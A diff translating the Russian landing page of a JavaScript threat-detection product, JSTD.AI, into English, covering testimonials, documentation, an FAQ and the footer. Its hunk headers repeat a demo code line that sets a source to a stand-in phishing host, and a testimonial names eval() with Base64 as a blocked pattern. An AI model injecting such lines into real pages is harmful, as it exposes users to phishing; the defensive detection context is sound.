+                        <div class="tcard__tag">Outsourcing / Development</div>
                     </div>
 
                     <div class="tcard">
                         <div class="tcard__quote">
                             <svg width="32" height="24" viewBox="0 0 32 24" fill="none">
-                                <path
-                                    d="M0 24V14C0 9.333 1.6 5.333 4.8 2 6.133.667 7.6 0 9.2 0L10.4 2.4C8.267 3.2 6.667 4.4 5.6 6c-.8 1.2-1.2 2.533-1.2 4H8V24H0ZM18 24V14c0-4.667 1.6-8.667 4.8-12C24.133.667 25.6 0 27.2 0L28.4 2.4c-2.133.8-3.733 2-4.8 3.6-.8 1.2-1.2 2.533-1.2 4H26V24H18Z"
+                                <path d="M0 24V14C0 9.333 1.6 5.333 4.8 2 6.133.667 7.6 0 9.2 0L10.4 2.4C8.267 3.2 6.667 4.4 5.6 6c-.8 1.2-1.2 2.533-1.2 4H8V24H0ZM18 24V14c0-4.667 1.6-8.667 4.8-12C24.133.667 25.6 0 27.2 0L28.4 2.4c-2.133.8-3.733 2-4.8 3.6-.8 1.2-1.2 2.533-1.2 4H26V24H18Z"
                                     fill="#ff6600" fill-opacity="0.2" />
                             </svg>
                         </div>
-                        <p class="tcard__text">«Запускаем JSTD.AI как шаг в CI/CD перед деплоем на стейджинг-сервер. Интеграция заняла 20 минут. Теперь если в PR появляется что-то с eval() + Base64 — пайплайн падает автоматически и PR не мёрджится. Разработчики стали аккуратнее
-                            с зависимостями.»</p>
+                        <p class="tcard__text">"We run JSTD.AI as a CI/CD step before deploying to the staging server. Integration took 20 minutes. Now if a PR contains anything with eval() + Base64 — the pipeline fails automatically and the PR won't merge. Developers have become much more careful with dependencies."</p>
                         <div class="tcard__author">
-                            <div class="tcard__avatar">ЕП</div>
+                            <div class="tcard__avatar">EP</div>
                             <div>
-                                <strong>Елена Петухова</strong>
+                                <strong>Elena Petukhova</strong>
                                 <span>DevOps Engineer, LogiCore Systems</span>
                             </div>
                             <div class="tcard__stars">★★★★★</div>
@@ -694,35 +683,33 @@ f.src = <span class="c-str">'https://phishing.site'</span>;
                     <div class="tcard">
                         <div class="tcard__quote">
                             <svg width="32" height="24" viewBox="0 0 32 24" fill="none">
-                                <path
-                                    d="M0 24V14C0 9.333 1.6 5.333 4.8 2 6.133.667 7.6 0 9.2 0L10.4 2.4C8.267 3.2 6.667 4.4 5.6 6c-.8 1.2-1.2 2.533-1.2 4H8V24H0ZM18 24V14c0-4.667 1.6-8.667 4.8-12C24.133.667 25.6 0 27.2 0L28.4 2.4c-2.133.8-3.733 2-4.8 3.6-.8 1.2-1.2 2.533-1.2 4H26V24H18Z"
+                                <path d="M0 24V14C0 9.333 1.6 5.333 4.8 2 6.133.667 7.6 0 9.2 0L10.4 2.4C8.267 3.2 6.667 4.4 5.6 6c-.8 1.2-1.2 2.533-1.2 4H8V24H0ZM18 24V14c0-4.667 1.6-8.667 4.8-12C24.133.667 25.6 0 27.2 0L28.4 2.4c-2.133.8-3.733 2-4.8 3.6-.8 1.2-1.2 2.533-1.2 4H26V24H18Z"
                                     fill="#00d4ff" fill-opacity="0.15" />
                             </svg>
                         </div>
-                        <p class="tcard__text">«Госконтракт требует сертификации поставляемого ПО. JSTD.AI генерирует HTML-отчёт с детализацией каждого найденного паттерна — это стало частью нашего пакета документов для заказчика. Больше не нужен отдельный пентест для базового
-                            аудита JS-компонентов.»</p>
+                        <p class="tcard__text">"A government contract requires certification of delivered software. JSTD.AI generates an HTML report detailing every detected pattern — this has become part of our document package for the client. No longer need a separate pentest for a basic audit of JS components."</p>
                         <div class="tcard__author">
-                            <div class="tcard__avatar">ИР</div>
+                            <div class="tcard__avatar">IR</div>
                             <div>
-                                <strong>Игорь Рязанцев</strong>
+                                <strong>Igor Ryazantsev</strong>
                                 <span>Information Security Auditor, GovTech Solutions</span>
                             </div>
                             <div class="tcard__stars">★★★★★</div>
                         </div>
-                        <div class="tcard__tag">Госсектор / Аудит ИБ</div>
+                        <div class="tcard__tag">Gov sector / Security audit</div>
                     </div>
 
                 </div>
 
                 <div class="testimonials__controls">
-                    <button class="tctl tctl--prev" id="tPrev" aria-label="Предыдущий">
+                    <button class="tctl tctl--prev" id="tPrev" aria-label="Previous">
                         <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                             <path d="M13 4L7 10L13 16" stroke="currentColor" stroke-width="1.5"
                                 stroke-linecap="square" />
                         </svg>
                     </button>
                     <div class="testimonials__dots" id="tDots"></div>
-                    <button class="tctl tctl--next" id="tNext" aria-label="Следующий">
+                    <button class="tctl tctl--next" id="tNext" aria-label="Next">
                         <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                             <path d="M7 4L13 10L7 16" stroke="currentColor" stroke-width="1.5"
                                 stroke-linecap="square" />
@@ -736,19 +723,17 @@ f.src = <span class="c-str">'https://phishing.site'</span>;
     <!-- ░░ DOCS ░░ -->
     <section class="section" id="docs">
         <div class="container">
-            <div class="section__label">Документация</div>
-            <h2 class="section__title">Всё, что нужно знать<br />для работы</h2>
-            <p class="section__desc">JSTD.AI не требует настройки или технической экспертизы. Загрузите файл — получите результат. Ниже — полное описание интерфейса и интерпретация данных.</p>
+            <div class="section__label">Documentation</div>
+            <h2 class="section__title">Everything you need<br />to get started</h2>
+            <p class="section__desc">JSTD.AI requires no configuration or technical expertise. Upload a file — get a result. Below is the full interface reference and data interpretation guide.</p>
 
             <!-- QUICKSTART -->
             <div class="docs-quickstart">
                 <div class="docs-qs-step">
                     <div class="docs-qs-num">01</div>
                     <div class="docs-qs-body">
-                        <strong>Загрузите JS-файлы</strong>
-                        <p>Нажмите кнопку <code>Load file(s)…</code> и выберите один или несколько
-                            <code>.js</code>-файлов. Поддерживается минифицированный, обфусцированный и многострочный код любого размера.
-                        </p>
+                        <strong>Load JS files</strong>
+                        <p>Click <code>Load file(s)…</code> and select one or more <code>.js</code> files. Minified, obfuscated, and multi-line code of any size is supported.</p>
                     </div>
                 </div>
                 <div class="docs-qs-arrow">
@@ -759,8 +744,8 @@ f.src = <span class="c-str">'https://phishing.site'</span>;
                 <div class="docs-qs-step">
                     <div class="docs-qs-num">02</div>
                     <div class="docs-qs-body">
-                        <strong>Дождитесь анализа</strong>
-                        <p>Нейросетевой движок обрабатывает каждый файл за <code>&lt;&thinsp;1&thinsp;ms</code>. Результаты появляются мгновенно в панели <em>Analysis results</em>. Несколько файлов анализируются параллельно.</p>
+                        <strong>Wait for analysis</strong>
+                        <p>The neural engine processes each file in <code>&lt;&thinsp;1&thinsp;ms</code>. Results appear instantly in the <em>Analysis results</em> panel. Multiple files are analyzed in parallel.</p>
                     </div>
                 </div>
                 <div class="docs-qs-arrow">
@@ -771,10 +756,8 @@ f.src = <span class="c-str">'https://phishing.site'</span>;
                 <div class="docs-qs-step">
                     <div class="docs-qs-num">03</div>
                     <div class="docs-qs-body">
-                        <strong>Изучите отчёт</strong>
-                        <p>Кликните по строке в таблице — откроется детализация <em>Threat Details</em> с тремя вкладками. При необходимости экспортируйте полный HTML-отчёт кнопкой
-                            <code>Save as HTML report</code>.
-                        </p>
+                        <strong>Review the report</strong>
+                        <p>Click a row in the table to open the <em>Threat Details</em> panel with three tabs. Export a full HTML report using the <code>Save as HTML report</code> button if needed.</p>
                     </div>
                 </div>
             </div>
@@ -795,14 +778,13 @@ f.src = <span class="c-str">'https://phishing.site'</span>;
                         </svg>
                     </div>
                     <div class="docs-card__label">Source code viewer</div>
-                    <h3>Просмотрщик кода</h3>
-                    <p>Отображает исходный код выбранного файла с синтаксической подсветкой. Комментарии, строки, ключевые слова и опасные конструкции выделяются цветом. Файл можно прокручивать — размер не ограничен.
-                    </p>
+                    <h3>Code Viewer</h3>
+                    <p>Displays the source code of the selected file with syntax highlighting. Comments, strings, keywords, and dangerous constructs are color-coded. The file can be scrolled — no size limit.</p>
                     <div class="docs-card__hint">
                         <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
                             <circle cx="7" cy="7" r="6" stroke="#f59e0b" stroke-width="1" />
                             <path d="M7 4V7.5M7 9.5V10" stroke="#f59e0b" stroke-width="1.2" stroke-linecap="square" />
-                        </svg> Выберите файл в таблице справа — код обновится автоматически
+                        </svg> Select a file in the table on the right — the code updates automatically
                     </div>
                 </div>
 
@@ -819,8 +801,8 @@ f.src = <span class="c-str">'https://phishing.site'</span>;
                         </svg>
                     </div>
                     <div class="docs-card__label">Analysis results</div>
-                    <h3>Таблица результатов</h3>
-                    <p>Каждая строка — один файл. Столбцы: <strong>File Name</strong>, <strong>Threat Level</strong> (цветовая метка), <strong>Score</strong> (итоговый балл в процентах). Строки кликабельны — открывают детали в нижней панели.</p>
+                    <h3>Results Table</h3>
+                    <p>Each row represents one file. Columns: <strong>File Name</strong>, <strong>Threat Level</strong> (color label), <strong>Score</strong> (final score in percent). Rows are clickable — they open details in the bottom panel.</p>
                     <div class="docs-card__threat-mini">
                         <div class="dtm-row"><span class="level-badge safe">SAFE</span><span>0 – 15%</span></div>
                         <div class="dtm-row"><span class="level-badge low">LOW</span><span>15 – 35%</span></div>
@@ -840,9 +822,9 @@ f.src = <span class="c-str">'https://phishing.site'</span>;
                                 stroke-linecap="square" />
                         </svg>
                     </div>
-                    <div class="docs-card__label">Вкладка — Threat Details</div>
+                    <div class="docs-card__label">Tab — Threat Details</div>
                     <h3>Summary</h3>
-                    <p>Итоговый вердикт по файлу. Показывает уровень угрозы, три независимых скора и текстовое резюме. Отображает количество найденных нарушений и финальную рекомендацию.</p>
+                    <p>Final verdict for the file. Shows the threat level, three independent scores, and a text summary. Displays the number of violations found and the final recommendation.</p>
                     <div class="docs-card__scores">
                         <div class="dcs-row">
                             <span>Overall Threat Score</span>
@@ -879,9 +861,9 @@ f.src = <span class="c-str">'https://phishing.site'</span>;
                                 stroke-linecap="square" opacity=".5" />
                         </svg>
                     </div>
-                    <div class="docs-card__label">Вкладка — Threat Details</div>
+                    <div class="docs-card__label">Tab — Threat Details</div>
                     <h3>Triggered Rules</h3>
-                    <p>Список сработавших эвристических правил. Каждое правило содержит название, severity в процентах и краткое описание атаки. Правила ранжированы по убыванию опасности.</p>
+                    <p>List of triggered heuristic rules. Each rule contains a name, severity in percent, and a brief attack description. Rules are ranked by descending severity.</p>
                     <div class="docs-card__rules-demo">
                         <div class="drd-row drd-row--crit">
                             <span class="drd-dot"></span>
@@ -921,9 +903,9 @@ f.src = <span class="c-str">'https://phishing.site'</span>;
                             <path d="M14 3V6M14 22V25M3 14H6M22 14H25" stroke="#00d4ff" stroke-width="1" opacity=".4" />
                         </svg>
                     </div>
-                    <div class="docs-card__label">Вкладка — Threat Details</div>
+                    <div class="docs-card__label">Tab — Threat Details</div>
                     <h3>Detected Features</h3>
-                    <p>Сырые метрики, извлечённые из кода. Таблица из 50 признаков: Feature (название), Count (абсолютное количество), Description (что означает). Используется для ручного аудита и понимания решения нейросети.</p>
+                    <p>Raw metrics extracted from the code. A table of 50 features: Feature (name), Count (absolute value), Description (what it means). Used for manual audit and understanding the neural network's decision.</p>
                     <div class="docs-card__features-demo">
                         <div class="dfd-header">
                             <span>Feature</span>
@@ -962,9 +944,9 @@ f.src = <span class="c-str">'https://phishing.site'</span>;
                                 stroke-linecap="square" />
                         </svg>
                     </div>
-                    <div class="docs-card__label">Боковая панель</div>
+                    <div class="docs-card__label">Side panel</div>
                     <h3>System Monitor</h3>
-                    <p>Живой мониторинг состояния движка. Обновляется каждые 500&thinsp;мс. Все данные — локальные, никуда не отправляются.</p>
+                    <p>Live engine status monitoring. Updated every 500&thinsp;ms. All data is local — nothing is transmitted anywhere.</p>
                     <div class="docs-card__sysmon">
                         <div class="dsm-group">
                             <div class="dsm-title">[&gt;] Neural Network</div>
@@ -987,7 +969,7 @@ f.src = <span class="c-str">'https://phishing.site'</span>;
 
             <!-- FAQ ACCORDION -->
             <div class="docs-faq">
-                <div class="docs-faq__title">Частые вопросы</div>
+                <div class="docs-faq__title">Frequently Asked Questions</div>
                 <div class="docs-faq__list" id="faqList">
                     <div class="faq-item">
                         <button class="faq-item__q" aria-expanded="false">
@@ -995,9 +977,9 @@ f.src = <span class="c-str">'https://phishing.site'</span>;
                                 <path d="M4 6L8 10L12 6" stroke="currentColor" stroke-width="1.4"
                                     stroke-linecap="square" />
                             </svg>
-                            Безопасно ли передавать мой код в программу?
+                            Is it safe to pass my code to the program?
                         </button>
-                        <div class="faq-item__a">JSTD.AI работает полностью офлайн. Код не покидает ваш компьютер ни при каких условиях — никаких облачных API, телеметрии или обратных соединений. Весь анализ выполняется локально в памяти процесса.</div>
+                        <div class="faq-item__a">JSTD.AI works completely offline. Code never leaves your computer under any circumstances — no cloud APIs, telemetry, or outbound connections. All analysis is performed locally in process memory.</div>
                     </div>
                     <div class="faq-item">
                         <button class="faq-item__q" aria-expanded="false">
@@ -1005,11 +987,9 @@ f.src = <span class="c-str">'https://phishing.site'</span>;
                                 <path d="M4 6L8 10L12 6" stroke="currentColor" stroke-width="1.4"
                                     stroke-linecap="square" />
                             </svg>
-                            Почему у безопасного кода с <code>fetch()</code> балл не нулевой?
+                            Why does safe code with <code>fetch()</code> get a non-zero score?
                         </button>
-                        <div class="faq-item__a">Нейросеть оценивает вероятность угрозы статистически. Наличие
-                            <code>fetch()</code>, <code>XMLHttpRequest</code> или <code>localStorage</code> само по себе не является угрозой — но поднимает базовый скор. Итоговая классификация учитывает комбинацию признаков: единичный <code>fetch()</code>                            без опасного контекста даёт уровень SAFE или LOW.
-                        </div>
+                        <div class="faq-item__a">The neural network assesses threat probability statistically. The presence of <code>fetch()</code>, <code>XMLHttpRequest</code>, or <code>localStorage</code> on its own is not a threat — but it raises the base score. The final classification considers a combination of features: a single <code>fetch()</code> without a dangerous context will yield a SAFE or LOW level.</div>
                     </div>
                     <div class="faq-item">
                         <button class="faq-item__q" aria-expanded="false">
@@ -1017,10 +997,9 @@ f.src = <span class="c-str">'https://phishing.site'</span>;
                                 <path d="M4 6L8 10L12 6" stroke="currentColor" stroke-width="1.4"
                                     stroke-linecap="square" />
                             </svg>
-                            Что значит «Обфускация», если код написан вручную?
+                            What does "Obfuscation" mean if the code was written by hand?
                         </button>
-                        <div class="faq-item__a">Признак«Obfuscation level» — это не флаг пропуска через обфускатор, а метрика характеристик кода: длинные строки без пробелов, высокая энтропия, hex-литералы, минимум комментариев. Минифицированные бандлы (webpack, esbuild) будут
-                            иметь ненулевой уровень — это нормально и учитывается при расчёте итогового балла.</div>
+                        <div class="faq-item__a">The "Obfuscation level" feature is not a flag indicating a run through an obfuscator — it is a metric of code characteristics: long strings without spaces, high entropy, hex literals, minimal comments. Minified bundles (webpack, esbuild) will have a non-zero level — this is normal and is factored into the final score calculation.</div>
                     </div>
                     <div class="faq-item">
                         <button class="faq-item__q" aria-expanded="false">
@@ -1028,10 +1007,9 @@ f.src = <span class="c-str">'https://phishing.site'</span>;
                                 <path d="M4 6L8 10L12 6" stroke="currentColor" stroke-width="1.4"
                                     stroke-linecap="square" />
                             </svg>
-                            Что содержит HTML-отчёт?
+                            What does the HTML report contain?
                         </button>
-                        <div class="faq-item__a">HTML-отчёт включает: шапку с датой и именем аналитика, итоговую таблицу по всем файлам, детализацию каждого файла (Summary + Triggered Rules + Detected Features), исходный код и временну́ю метку анализа. Файл самодостаточен — не
-                            требует интернета для просмотра.</div>
+                        <div class="faq-item__a">The HTML report includes: a header with date and analyst name, a summary table for all files, a detailed breakdown for each file (Summary + Triggered Rules + Detected Features), source code, and an analysis timestamp. The file is self-contained — no internet required to view it.</div>
                     </div>
                     <div class="faq-item">
                         <button class="faq-item__q" aria-expanded="false">
@@ -1039,10 +1017,9 @@ f.src = <span class="c-str">'https://phishing.site'</span>;
                                 <path d="M4 6L8 10L12 6" stroke="currentColor" stroke-width="1.4"
                                     stroke-linecap="square" />
                             </svg>
-                            Можно ли анализировать минифицированные файлы?
+                            Can minified files be analyzed?
                         </button>
-                        <div class="faq-item__a">Да. Нейросеть обучена на примерах минифицированного кода. Признаки извлекаются независимо от форматирования. Минификация сама по себе поднимает признак обфускации, но не влияет на итоговую классификацию — при отсутствии опасных
-                            паттернов файл получит SAFE или LOW.</div>
+                        <div class="faq-item__a">Yes. The neural network was trained on minified code examples. Features are extracted independently of formatting. Minification itself raises the obfuscation feature, but does not affect the final classification — without dangerous patterns the file will receive SAFE or LOW.</div>
                     </div>
                 </div>
             </div>
@@ -1055,26 +1032,26 @@ f.src = <span class="c-str">'https://phishing.site'</span>;
         <div class="cta-section__bg"></div>
         <div class="container">
             <div class="cta-inner">
-                <div class="section__label">Защита начинается здесь</div>
+                <div class="section__label">Security starts here</div>
                 <h2 class="cta-inner__title">
-                    Каждый JS-файл —<br /> это потенциальная<br />
-                    <span class="cracked-word cracked-word--lg" data-text="дыра">дыра</span>
+                    Every JS file is<br /> a potential<br />
+                    <span class="cracked-word cracked-word--lg" data-text="hole">hole</span>
                 </h2>
-                <p>JSTD.AI работает полностью локально на Windows. Не нужен интернет. Не нужен GPU. Установка займёт минуту — первый анализ будет через три.</p>
+                <p>JSTD.AI runs completely offline on Windows. No internet required. No GPU needed. Installation takes a minute — your first analysis will be done within three.</p>
                 <div class="cta-inner__actions">
-                    <a href="./download" class="btn btn--primary btn--lg">
+                    <a href="#" class="btn btn--primary btn--lg">
                         <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
                             <path d="M9 2V12M9 12L5 8M9 12L13 8" stroke="currentColor" stroke-width="1.5"
                                 stroke-linecap="square" />
                             <path d="M3 15H15" stroke="currentColor" stroke-width="1.5" stroke-linecap="square" />
-                        </svg> Скачать JSTD.AI
+                        </svg> Download JSTD.AI
                     </a>
-                    <a href="#" class="btn btn--ghost btn--lg">
+                    <a href="#docs" class="btn btn--ghost btn--lg">
                         <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
                             <path d="M3 3H15V15H3V3Z" stroke="currentColor" stroke-width="1.5" />
                             <path d="M7 7H11M7 10H11" stroke="currentColor" stroke-width="1.3"
                                 stroke-linecap="square" />
-                        </svg> Документация
+                        </svg> Documentation
                     </a>
                 </div>
                 <div class="cta-inner__specs">
@@ -1094,12 +1071,12 @@ f.src = <span class="c-str">'https://phishing.site'</span>;
                         <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                             <rect x="2" y="2" width="12" height="12" stroke="#a78bfa" stroke-width="1.2" />
                             <path d="M5 8H11M8 5V11" stroke="#a78bfa" stroke-width="1.2" stroke-linecap="square" />
-                        </svg> 4 МБ установочный файл
+                        </svg> 4 MB installer
                     </div>
                     <div class="spec">
                         <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                             <path d="M3 8L6 11L13 5" stroke="#00ff88" stroke-width="1.5" stroke-linecap="square" />
-                        </svg> Без интернета
+                        </svg> No internet required
                     </div>
                 </div>
             </div>
@@ -1122,30 +1099,30 @@ f.src = <span class="c-str">'https://phishing.site'</span>;
                         </svg>
                         <span class="nav__logo-text">JSTD<span class="brand-accent">.AI</span></span>
                     </a>
-                    <p>Проприетарная нейросетевая система<br />детекции угроз в JavaScript-коде.</p>
-                    <p class="footer__copy">© 2026 JSTD.AI. Все права защищены.<br />Авторская разработка. Нейросетевая модель запатентована.</p>
+                    <p>Proprietary neural threat detection system<br />for JavaScript code.</p>
+                    <p class="footer__copy">© 2026 JSTD.AI. All rights reserved.<br />Proprietary development. Neural model is patented.</p>
                 </div>
                 <div class="footer__cols">
                     <div class="footer__col">
-                        <div class="footer__col-title">Продукт</div>
-                        <a href="#">Скачать</a>
-                        <a href="#">Документация</a>
+                        <div class="footer__col-title">Product</div>
+                        <a href="#">Download</a>
+                        <a href="#">Documentation</a>
                         <a href="#">Changelog</a>
-                        <a href="#">Лицензия</a>
+                        <a href="#">License</a>
                     </div>
                     <div class="footer__col">
-                        <div class="footer__col-title">Компания</div>
-                        <a href="#">О нас</a>
-                        <a href="#">Блог</a>
-                        <a href="#">Пресса</a>
-                        <a href="#">Контакты</a>
+                        <div class="footer__col-title">Company</div>
+                        <a href="#">About</a>
+                        <a href="#">Blog</a>
+                        <a href="#">Press</a>
+                        <a href="#">Contact</a>
                     </div>
                     <div class="footer__col">
-                        <div class="footer__col-title">Безопасность</div>
-                        <a href="#">Ответственное раскрытие</a>
-                        <a href="#">Политика приватности</a>
+                        <div class="footer__col-title">Security</div>
+                        <a href="#">Responsible Disclosure</a>
+                        <a href="#">Privacy Policy</a>
                         <a href="#">OSINT</a>
-                        <a href="#">CVE-база</a>
+                        <a href="#">CVE Database</a>
                     </div>
                 </div>
             </div>
@@ -1177,7 +1154,7 @@ f.src = <span class="c-str">'https://phishing.site'</span>;
         </div>
     </footer>
 
-    <script src="app/main.js"></script>
+    <script src="../app/main.js"></script>
 </body>
 
 </html>
